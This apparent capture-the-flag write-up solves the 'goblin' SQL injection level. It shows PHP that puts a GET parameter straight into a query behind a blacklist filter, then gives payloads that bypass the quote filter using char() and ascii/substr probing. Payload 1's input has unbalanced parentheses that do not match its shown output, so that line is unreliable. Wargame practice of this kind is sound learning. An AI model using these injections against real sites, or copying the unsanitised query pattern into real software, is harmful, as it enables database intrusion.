```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

PAYLOAD 1: ?no=-1 or ascii(substr(id,1,1)=97
OUTPUT: select id from prob_goblin where id='guest' and no=-1 or ascii(substr(id,1,1))=97

PAYLOAD 2: ?no=-1 or id=char(97,100,109,105,110)
OUTPUT: query : select id from prob_goblin where id='guest' and no=-1 or id=char(97, 100, 109, 105, 110)

Goblin clear 
